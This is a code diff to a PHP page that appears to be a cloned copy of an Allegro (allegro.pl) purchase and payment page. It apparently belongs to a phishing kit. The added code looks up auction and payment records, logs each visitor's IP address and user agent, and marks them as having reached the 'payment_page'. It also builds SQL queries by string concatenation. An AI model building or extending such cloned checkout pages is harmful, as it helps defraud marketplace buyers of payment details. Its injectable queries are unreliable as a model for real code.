@@ -15,6 +15,16 @@ $sql = "SELECT * FROM `auctions` AS t1 LEFT JOIN `purchases` AS t2 ON t1.id=t2.a
 $newsp = $con->query($sql);
 $row_auction = $newsp->fetch_assoc();
 
+
+if($row_auction['id'] && $row_auction['payment_id']) {
+
+    $userip = get_client_ip_env();
+    $useragent = htmlspecialchars($_SERVER['HTTP_USER_AGENT'], ENT_QUOTES, 'UTF-8');
+
+    $sqlup = "UPDATE `auctions` SET `page_status` = 'payment_page', `userip` = '$userip', `useragent` = '$useragent' WHERE `payment_id`='".$row_auction['payment_id']."' AND `id`='".$row_auction['auction_id']."'";
+    $con->query($sqlup);
+}
+
 ?>
 <!DOCTYPE html>
 <!-- saved from url=(0096)https://allegro.pl/transaction-front/app/user/purchase/e3740be0-2df9-11e8-a9a0-239c66f09ef6/dapf -->
@@ -418,7 +428,7 @@ if (window.performance && typeof window.performance.mark === 'function' && typeo
                                     <label class="col-xm-offset-1 col-xs-offset-2 col-xm-10 col-xs-8 col-ss-7 col-sm-offset-0 col-sm-3 control-label" for="focus-message-e37432f0-2df9-11e8-a9a0-239c66f09ef6" translate="">adres</label>
                                     <div class="col-xm-offset-1 col-xs-offset-2 col-xm-10 col-xs-8 col-ss-7 col-sm-offset-0 col-sm-6">
                                         <div class="input-group-validation right-sm">
-                                            <textarea id="focus-message-e37432f0-2df9-11e8-a9a0-239c66f09ef6" class="message-to-seller form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" ng-model="$ctrl.order.messageToSeller" id="address"  name ="address" maxlength="1000"><?php echo $message_to_seller;?></textarea>
+                                            <textarea id="focus-message-e37432f0-2df9-11e8-a9a0-239c66f09ef6" class="message-to-seller form-control ng-pristine ng-untouched ng-valid ng-empty ng-valid-maxlength" ng-model="$ctrl.order.messageToSeller" id="address"  name ="address" maxlength="1000"></textarea>
                                         </div>
                                     </div>
                                 </div>
